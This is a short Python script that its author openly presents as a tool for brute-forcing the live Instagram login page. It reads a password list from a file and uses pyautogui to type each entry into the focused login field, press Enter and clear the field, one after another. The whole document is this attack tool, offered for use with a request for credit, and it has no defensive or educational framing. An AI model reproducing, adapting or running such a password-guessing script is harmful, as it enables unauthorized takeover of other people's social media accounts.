# Syed Md Abu Haider creates this code for brute force live insta log-in page.
#Use credit to use this tool




import pyautogui
import time
import sys

# Check if the user has provided the path to the password list file
if len(sys.argv) != 2:
    print("Usage: python script_name.py path_to_password_list.txt")
    sys.exit(1)

# Path to the text file containing passwords (one password per line)
text_file_path = sys.argv[1]

# Read passwords from the text file
try:
    with open(text_file_path, 'r') as file:
        words = file.read().splitlines()
except FileNotFoundError:
    print("File not found:", text_file_path)
    sys.exit(1)

# Give some time to switch to the target application
time.sleep(5)

# Type each password, wait for 1 second, hit Enter, and clear the text box
for word in words:
    pyautogui.typewrite(word)
    time.sleep(1)       # Wait for 1 second
    pyautogui.press('enter')
    time.sleep(0.5)     # Adjust the delay as needed

    # Select and delete the typed text
    pyautogui.hotkey('ctrl', 'a')  # Select all text
    pyautogui.press('delete')      # Delete selected text

print("All passwords have been typed, submitted, and text cleared.")
